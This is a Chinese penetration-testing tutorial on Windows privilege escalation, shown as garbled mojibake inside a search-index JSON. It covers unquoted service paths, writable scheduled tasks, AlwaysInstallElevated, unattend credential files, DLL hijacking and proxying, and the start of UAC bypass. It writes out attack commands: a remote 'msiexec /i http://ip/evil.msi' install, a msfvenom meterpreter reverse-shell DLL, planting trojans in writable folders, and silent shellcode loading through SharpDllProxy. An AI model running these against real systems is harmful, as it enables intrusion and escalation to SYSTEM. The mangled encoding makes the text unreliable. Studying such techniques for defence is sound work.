æœåŠ¡è·¯å¾„åŒ…å«ç©ºæ ¼ æˆ‘ä»¬æœ‰æŸä¸€ä¸­é—´æ–‡ä»¶å¤¹çš„å†™æƒé™ 3.2.1 æ£€æŸ¥ wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr/i /v \"\"\" 3.2.2 åˆ©ç”¨ æ¥ç€æŸ¥çœ‹æ˜¯å¦æœ‰å¯¹ç›®æ ‡æ–‡ä»¶å¤¹çš„å†™æƒé™ï¼Œä½¿ç”¨ Windows å†…ç½®å·¥å…· icaclsï¼Œä»¥æ­¤æ£€æŸ¥å„çº§è·¯å¾„ï¼š icacls \"C:\" icacls \"C:\\Program Files\" icacls \"C:\\Program Files\\VMware\" ä¾æ¬¡æŸ¥çœ‹å„çº§ç›®å½•æ˜¯å¦æœ‰å¯å†™æƒé™ï¼Œæœ€åæ‰¾åˆ° C:\\Program Files\\VMware ç›®å½•ï¼Œåœ¨è¯¥ç›®å½•ä¸‹æ–¹å¼æœ¨é©¬ï¼Œä¸Šçº¿åï¼Œå³ä¸ºé«˜æƒé™ã€‚ 3.3.3 msf ä¸­çš„æ¨¡å— exploit/windows/local/trusted_service_path æ¨¡å— ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3.3 è®¡åˆ’ä»»åŠ¡ææƒ å¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡æ‰€åœ¨ç›®å½•å…·æœ‰æ‰€å†™æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–åŸæ¥çš„ç¨‹åºï¼Œè¿™æ ·ï¼Œåœ¨è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶å°±ä¼šä»¥é«˜æƒé™æ¥è¿è¡Œæ¶æ„ç¨‹åºã€‚ Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike \"\\Microsoft\\Windows\\*\") -And ($_.Principal.UserId -notlike \"*$env:UserName*\")} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name=\"User\";Expression={$_.Principal.userID}} æŸ¥çœ‹æŸä¸ªç›®å½•çš„æƒé™é…ç½®æƒ…å†µ accesschk64.exe -dqv \"/path/to/dir\" å¦‚æœæ”»å‡»è€…å¯¹æŸä¸ªé«˜æƒé™çš„è®¡åˆ’ä»»åŠ¡æ‰€åœ¨çš„è·¯å¾„æœ‰å¯å†™æƒé™ï¼Œå¯ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–åŸæ¥çš„ç¨‹åºï¼Œå½“è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™è¿è¡Œæ¶æ„ç¨‹åºã€‚ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:3:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4 AlwaysInstallElevated ææƒ æ³¨å†Œè¡¨é”® AlwaysInstallElevated æ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®é¡¹ï¼ŒWindow å…è®¸ä½æƒé™ç”¨æˆ·ä»¥ System æƒé™è¿è¡Œ MSI å®‰è£…æ–‡ä»¶ï¼Œå¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆä»»ä½•æƒé™çš„ç”¨æˆ·éƒ½èƒ½ä»¥ NT AUTHORITY\\SYSTEM æƒé™æ¥è¿è¡Œæ¶æ„çš„ MSI æ–‡ä»¶ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4.1 æŸ¥è¯¢ æŸ¥è¯¢ï¼š reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated æœªå¯ç”¨ AlwaysInstallElevated ç­–ç•¥ï¼Œè¿”å›ç»“æœä¸ºï¼šã€Œæ‰¾ä¸åˆ°æŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹æˆ–å€¼ã€ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4.2 å¼€å¯ reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4.3 æ‰§è¡Œ MSI æ–‡ä»¶ æœ¬åœ°æ‰§è¡Œï¼šmsiexec /q /i C:\\msi.msi /i å‚æ•°ç”¨æ¥è¡¨ç¤ºå®‰è£…æ“ä½œ /q å‚æ•°ç”¨æ¥éšè—å®‰è£…ç•Œé¢ å¹¶ä¸” MSIEXEC ä¹Ÿå¯ä»¥å®ç°æ— è½åœ°æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œæœ¨é©¬ä¸Šçº¿çš„æ–¹å¼ï¼Œå½“ç„¶ä½æƒé™ç”¨ä¸äº†ï¼Œå› ä¸º msi æ–‡ä»¶éœ€è¦å¯ä¿¡çš„è¯ä¹¦æ‰èƒ½è¿œç¨‹åˆ©ç”¨ AlwaysInstallElevated ææƒï¼šmsiexec /q /i http://ip/evil.msi ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4.4 åˆ©ç”¨ 4.4.1 PowerUP è„šæœ¬ https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 æµ‹è¯•æ˜¯å¦å¯ç”¨ AlwaysInstallElevatedï¼š Import-Module .\\PowerUp.ps1 Get-RegistryAlwaysInstallElevated è¿”å› True ä»£è¡¨å¼€å¯ã€‚ 4.4.2 MSI Wrapper æ·»åŠ ç”¨æˆ· MSI Wrapper ä¸‹è½½åœ°å€ï¼šhttps://www.exemsi.com/download/ å°† Payload è®¾ç½®ä¸ºæ‰§è¡Œ ProcessHackerï¼š è¿è¡Œæ—¶è¦æ±‚æå‡æƒé™ï¼š MSI installation context ä¸‹é€‰æ‹© Per User å’Œ Per Machine éƒ½å¯ä»¥ã€‚ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"5 æ— äººå€¼å®ˆå®‰è£…æ–‡ä»¶ ä¸€äº› windows æ— äººå€¼å®ˆå®‰è£…æ–‡ä»¶ä¸­å«æœ‰ç”¨æˆ·çš„æ˜æ–‡æˆ– base64 ç¼–ç åçš„å¯†æ–‡ dir /s *sysprep.inf *sysprep.xml *unattend.xml *unattend.txt 2\u003enul å¸¸è§ä½ç½®ï¼š C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windos\\System32\\sysprep\\unattend.xml C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:5:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6 DLL åŠ«æŒææƒ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6.1 ç›¸å…³æ¦‚å¿µ 6.1.1 DLL ç®€ä»‹ ä½•ä¸ºåŠ«æŒ åœ¨æ­£å¸¸äº‹ç‰©å‘ç”Ÿä¹‹å‰è¿›è¡Œä¸€ä¸ªæ—è·¯æ“ä½œ åŠ¨æ€é“¾æ¥åº“(Dynamic-Link-Libraryï¼Œç¼©å†™ dll)ã€‚åœ¨ Windows ä¸­ï¼Œè®¸å¤šåº”ç”¨ç¨‹åºå¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒä»¬è¢«åˆ†å‰²æˆä¸€äº›ç›¸å¯¹ç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå³ DLL æ–‡ä»¶ï¼Œæ”¾ç½®äºç³»ç»Ÿä¸­ã€‚å½“æ‰§è¡ŒæŸä¸€ä¸ªç¨‹åºæ—¶ï¼Œç›¸åº”çš„ DLL æ–‡ä»¶å°±ä¼šè¢«è°ƒç”¨ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä½¿ç”¨å¤šä¸ª DLL æ–‡ä»¶ï¼Œä¸€ä¸ª DLL æ–‡ä»¶ä¹Ÿå¯èƒ½è¢«ä¸åŒçš„åº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œè¿™æ ·çš„ DLL æ–‡ä»¶è¢«ç§°ä¸ºå…±äº« DLL æ–‡ä»¶ã€‚ 6.1.2 DLL çš„åŠ è½½é¡ºåº å¾®è½¯çš„ DLL åŠ«æŒåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ æ— ä¿æŠ¤é˜¶æ®µï¼šWindows XP SP2 ä¹‹å‰ ä¿æŠ¤é˜¶æ®µï¼šWindows XP SP2 ä¹‹åï¼ŒWindows 7 ä¹‹å‰ è¿›ä¸€æ­¥ä¿æŠ¤é˜¶æ®µï¼šWindows 7 ä¹‹å Windows XP SP2 ä¹‹å‰ è¿›ç¨‹å¯¹åº”çš„åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½•ï¼› åŠ è½½ DLL æ—¶æ‰€åœ¨çš„å½“å‰ç›®å½• (SetCurrentDirectory)ï¼› ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•ï¼ˆé€šè¿‡ GetSystemDirectory è·å–ï¼‰ï¼› 16 ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•ï¼› Windows ç›®å½•ï¼šC:\\Windowsï¼ˆé€šè¿‡ GetWindowsDirectory è·å–ï¼‰ï¼› PATH ç¯å¢ƒå˜é‡ä¸­çš„å„ä¸ªç›®å½•ï¼› Windows XP SP2 ä¹‹å å¾®è½¯ä¸ºäº†é˜²æ­¢ DLL åŠ«æŒæ¼æ´çš„äº§ç”Ÿï¼Œåœ¨ XP SP2 ä¹‹åï¼Œæ·»åŠ äº†ä¸€ä¸ª SafeDllSearchMode çš„æ³¨å†Œè¡¨å±æ€§ã€‚æ³¨å†Œè¡¨è·¯å¾„å¦‚ä¸‹ï¼š HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode å½“ SafeDllSearchMode çš„å€¼è®¾ç½®ä¸º 1ï¼Œå³å®‰å…¨ DLL æœç´¢æ¨¡å¼å¼€å¯æ—¶ï¼ŒæŸ¥æ‰¾ DLL çš„ç›®å½•é¡ºåºå¦‚ä¸‹ï¼š åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½•ï¼› ç³»ç»Ÿç›®å½• SYSTEM32 ç›®å½•ï¼› 16 ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•ã€‚è¯¥é¡¹åªæ˜¯ä¸ºäº†å‘å‰å…¼å®¹çš„å¤„ç†ï¼Œå¯ä»¥ä¸è€ƒè™‘ Windows ç›®å½•ã€‚é€šå¸¸æ˜¯C:\\Windowsï¼› åŠ è½½ DLL æ—¶æ‰€åœ¨çš„å½“å‰ç›®å½•ï¼› ç¯å¢ƒå˜é‡ PATH ä¸­æ‰€æœ‰ç›®å½•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¸åŒ…æ‹¬ App Paths æ³¨å†Œè¡¨é¡¹æŒ‡å®šçš„åº”ç”¨ç¨‹åºè·¯å¾„ã€‚ win7 ä¹‹å å¾®è½¯ä¸ºäº†æ›´è¿›ä¸€æ­¥çš„é˜²å¾¡ç³»ç»Ÿçš„ DLL è¢«åŠ«æŒï¼Œå°†ä¸€äº›å®¹æ˜“è¢«åŠ«æŒçš„ç³»ç»Ÿ DLL å†™è¿›äº†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ä¸­ï¼Œé‚£ä¹ˆå‡¡æ˜¯æ­¤é¡¹ä¸‹çš„ DLL æ–‡ä»¶å°±ä¼šè¢«ç¦æ­¢ä» EXE è‡ªèº«æ‰€åœ¨çš„ç›®å½•ä¸‹è°ƒç”¨ï¼Œè€Œåªèƒ½ä»ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•ä¸‹è°ƒç”¨ã€‚æ³¨å†Œè¡¨è·¯å¾„å¦‚ä¸‹ï¼š HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs Windows æ“ä½œç³»ç»Ÿé€šè¿‡ã€ŒDLLè·¯å¾„æœç´¢ç›®å½•é¡ºåºã€å’Œã€ŒKnow DLLsæ³¨å†Œè¡¨é¡¹ã€çš„æœºåˆ¶æ¥ç¡®å®šåº”ç”¨ç¨‹åºæ‰€è¦è°ƒç”¨çš„ DLL çš„è·¯å¾„ï¼Œä¹‹åï¼Œåº”ç”¨ç¨‹åºå°±å°† DLL è½½å…¥äº†è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œæ‰§è¡Œç›¸åº”çš„å‡½æ•°åŠŸèƒ½ã€‚ æ³¨å†Œè¡¨è·¯å¾„ï¼šHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 6.1.3 åˆ†æ DLL çš„åŠ è½½è¿‡ç¨‹ - Process Monitor Process Monitor æ˜¯ Windows çš„é«˜çº§ç›‘è§†å·¥å…·ï¼Œå¯æ˜¾ç¤ºå®æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œæ³¨å†Œè¡¨å’Œè¿›ç¨‹/çº¿ç¨‹æ´»åŠ¨ã€‚ https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-utilities Process Monitor Filter æ˜¯ç”¨äºè¿‡æ»¤åº”ç”¨ç¨‹åºè¾“å‡ºçš„ä¸€éƒ¨åˆ†åŠŸèƒ½ï¼Œå¯ä»¥ä½¿å¾—è¿›ç¨‹äº‹ä»¶ç»“æœæˆä¸ºä½ æƒ³è¦çš„å†…å®¹ã€‚å¸¸ç”¨è¿‡æ»¤æ¡ä»¶ï¼šProcess Nameï¼ŒPathï¼ŒResult è®¾ç½® Process Name is å¾…æµ‹ç›®æ ‡ï¼Œè®¾ç½® Path ends with .dllï¼ŒResult is NAME NOT FOUND 6.1.4 DLL åŠ«æŒæ­¥éª¤ å¦‚æœåœ¨åº”ç”¨ç¨‹åºå¯»æ‰¾æˆåŠŸä¹‹å‰ï¼Œå°†æˆ‘ä»¬è‡ªå·±åˆ›é€ çš„ DLL æ–‡ä»¶æ”¾å…¥å¯»æ‰¾ç›®å½•ä¸­ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºå°±ä¼šåŠ è½½æˆ‘ä»¬è‡ªå·±çš„ DLL ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6.2 å®ç° 6.2.1 å®ç°ä¸€ä¸ª DLL åŠ«æŒ BOOL WINAPI DllMain( // æŒ‡å‘è‡ªèº«çš„å¥æŸ„ _In_ HINSTANCE hinstDLL, // è°ƒç”¨åŸå›  _In_ DWORD fdwReason, // åŠ è½½æ–¹å¼ï¼ˆéšå¼ã€æ˜¾å¼ï¼‰ _In_ LPVOID lpvReserved ); è½½å…¥çŠ¶æ€ å€¼ è¯´æ˜ DLL_PROCESS_ATTACH 1 è¢«è¿›ç¨‹è£…è½½æ—¶ DLL_PROCESS_DETACH 0 è¢«è¿›ç¨‹å¸è½½æ—¶ DLL_THREAD_ATTACH 2 è¢«çº¿ç¨‹è£…è½½æ—¶ DLL_THREAD_DETACH 3 è¢«çº¿ç¨‹å¸è½½æ—¶ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ printf(\"hModule.%p lpReserved.%p \\n\", hModule, lpReserved); switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: printf(\"Process attach. \\n\"); break; case DLL_PROCESS_DETACH: printf(\"Process detach. \\n\"); break; case DLL_THREAD_ATTACH: printf(\"Thread attach. \\n\"); break; case DLL_THREAD_DETACH: printf(\"Thread detach. \\n\"); break; } return (TRUE); } å¦‚æœåº”ç”¨ç¨‹åºè°ƒç”¨çš„ DLL æ²¡æœ‰ DLLMain å‡½æ•°å°±éœ€è¦å®ç°æŒ‡å®šå¯¼å‡ºå‡½æ•°ï¼Œç„¶åç­‰å¾…å¯¼å‡ºå‡½æ•°æ‰§è¡Œå®Œæ¯•å† Load çœŸå® DLLã€‚ 6.2.2 msf MSF ç”Ÿæˆ payloadï¼š msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll \u003e a.dll ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6.3 è‡ªåŠ¨åŒ–å·¥å…·æ£€æµ‹ 6.3.1 rattler https://github.com/sensepost/rattler å®ç°æ€è·¯ï¼š æšä¸¾è¿›ç¨‹è°ƒç”¨çš„ dll åˆ—è¡¨ï¼Œè§£æå‡º dll çš„åç§° å°†æµ‹è¯• dll åˆ†åˆ«é‡å‘½åä¸ºåˆ—è¡¨ä¸­çš„ dll åç§° å†æ¬¡å¯åŠ¨ç¨‹åºï¼Œæ£€æµ‹æ˜¯å¦æˆåŠŸåˆ›å»ºè¿›ç¨‹ calc.exeï¼Œå¦‚æœæˆåŠŸï¼Œä»£è¡¨å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨ æµ‹è¯•ï¼š ä½¿ç”¨ Visual Studio ç¼–è¯‘ Rattlerï¼Œå°† payload.dll æ”¾äºåŒçº§ç›®å½•ä¸‹ payload.dll ä¸‹è½½åœ°å€ï¼š https://github.com/sensepost/rattler/releases/download/v1.0/payload.dll ç®¡ç†å‘˜æƒé™çš„ cmd ä¸‹è¿è¡Œå‘½ä»¤ï¼š Rattler.exe [å¾…æ£€æµ‹ç¨‹åºåç§°] 1 6.3.2 ChkDllHijack ä½¿ç”¨ windbg å¯¼å‡º moduleï¼š æ‰“å¼€ chkDllHijackï¼Œç²˜è´´å¤„è¦éªŒè¯çš„ DLL å†…å®¹ï¼Œç­‰å¾…å…¶è¿è¡Œå®Œæ¯•ï¼Œæ£€æŸ¥ç»“æœï¼š ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6.4 DLL Side-Loading(DLL Proxy Loading) 6.4.1 åŸç† ä¸ä½¿åº”ç”¨ç¨‹åºå´©æºƒçš„æƒ…å†µä¸‹åˆ©ç”¨ DLL Hijack æ¼æ´ã€‚å°†åˆæ³•å‡½æ•°è°ƒç”¨é‡å®šå‘åˆ°åŸå§‹ DLLï¼Œåœ¨åå°é™é»˜åŠ è½½æˆ‘ä»¬çš„ shellcodeã€‚ DLL Side-Loading ä¸ DLL åŠ«æŒéå¸¸ç›¸ä¼¼ã€‚ä½†æ˜¯ï¼Œå®ƒä¸ä¼šç ´ååŸå§‹ç¨‹åºçš„æ‰§è¡Œæµç¨‹æˆ–åŠŸèƒ½ã€‚ï¼Œå°†æ¶æ„ç¨‹åºéšè—åœ¨åˆæ³•åº”ç”¨ç¨‹åºä¹‹åï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥æ–¹æ³•ç»´æŒæƒé™ã€‚ DLL Proxy æµç¨‹å›¾ï¼š å¯åŠ¨æ—¶ï¼Œåº”ç”¨ç¨‹åº A éœ€è¦ä½¿ç”¨åä¸º GetFunkyData() çš„ç¬¬ä¸‰æ–¹å‡½æ•°æ¥è·å–æ•°æ®ï¼ŒGetFunkyData() å­˜åœ¨äºåŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œè¯¥åŠ¨æ€é“¾æ¥åº“ä½äºåº”ç”¨ç¨‹åºçš„å·¥ä½œç›®å½•ä¸­ï¼Œåä¸º DataFunctions_Original.dll (B)ã€‚ åº”ç”¨ç¨‹åº A ä»¥å…¶åç§°åŠ è½½åº“ DataFunctions.dllï¼Œä»¥å°è¯•æ‰§è¡Œ GetFunkyData()ã€‚ è¯¥ DLL å®é™…ä¸Šæ˜¯æ”»å‡»è€…ä¸“é—¨è®¾è®¡çš„â€œä»£ç†â€åº“ï¼Œä»£ç† DLL ä½¿ç”¨å°†å‡½æ•°è°ƒç”¨é‡å®šå‘åˆ°åŸå§‹ DLLâ€œ DataFunctions_Original.dllâ€ï¼ˆBï¼‰ã€‚ æ­¤æ—¶ï¼Œæ”»å‡»è€…å·²ç»åŠ«æŒäº†æ‰§è¡Œæµç¨‹ï¼ˆCï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ä»£è¡¨è¿è¡Œä¸­çš„è¿›ç¨‹ï¼ˆEï¼‰æ‰§è¡Œä»£ç ï¼Œè€Œæ— éœ€ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºçš„äº†è§£ã€‚ 6.4.2 åˆ©ç”¨ https://github.com/Flangvik/SharpDllProxy SharpDllProxy.exe --dll /path/to/targetDLL.dll --payload shellcode.bin ç°åœ¨éœ€è¦å°†ç¨‹åºç”Ÿæˆçš„æºç è¿›è¡Œç¼–è¯‘ï¼Œæ‰“å¼€ VS 2019ï¼Œé€‰æ‹©åˆ›å»ºæ–°å·¥ç¨‹ï¼š é€‰æ‹© C++ è¯­è¨€ï¼Œæœç´¢ Library ï¼Œç„¶åç‚¹å‡» DLLæ¨¡æ¿ï¼š é¡¹ç›®åç§°åº”è¯¥åŒ¹é…æˆ‘ä»¬è¦åŠ«æŒçš„ DLL åç§°ã€‚å°†å·¥å…·ç”Ÿæˆçš„ä»£ç å†…å®¹å¤åˆ¶åˆ° dllmain.cpp ä¸­ï¼š å½“ DLL_PROCESS_ATTACH æ—¶é—´è¢«è§¦å‘æ—¶ï¼ŒDLL ä¼šåˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ã€‚DoMagic() å‡½æ•°ä» shellcode.bin è¯»å– payload åˆ°å†…å­˜ä¸­ï¼Œå¹¶æ‰§è¡Œã€‚ ä¸‹ä¸€æ­¥å³å¯ç¼–è¯‘è¯¥ DLL åº“æ–‡ä»¶ï¼Œé€‰æ‹©åˆé€‚çš„æ¶æ„ï¼šx64/x86ï¼Œç„¶åé€‰æ‹© releaseï¼Œbuild å³å¯ã€‚ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"7 Bypass UAC ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"7.1 åŸç†åŠæ¦‚å¿µ User Account Control(UAC)æ˜¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬ä¸­å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œé’ˆå¯¹å…·æœ‰æœ‰é™æƒé™çš„è´¦æˆ·ã€‚é€šè¿‡ UACï¼Œåº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ç‰¹åˆ«æˆäºˆç®¡ç†å‘˜çº§åˆ«çš„ç³»ç»Ÿè®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè‡ªåŠ¨è¿›è¡Œå®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚ 7.1.1 UAC çš„å®ç° ACLï¼ˆAccess Control Listï¼‰ï¼šWindows ä¸­æ‰€æœ‰èµ„æºéƒ½æœ‰ ACL ï¼Œè¿™ä¸ªåˆ—è¡¨å†³å®šäº†æ‹¥æœ‰ä½•ç§æƒé™çš„ç”¨æˆ·/è¿›ç¨‹èƒ½å¤Ÿè¿™ä¸ªèµ„æºã€‚ åœ¨å¼€å¯äº† UAC ä¹‹åï¼Œå¦‚æœç”¨æˆ·æ˜¯æ ‡å‡†ç”¨æˆ·ï¼Œ Windows ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªæ ‡å‡† Access Token 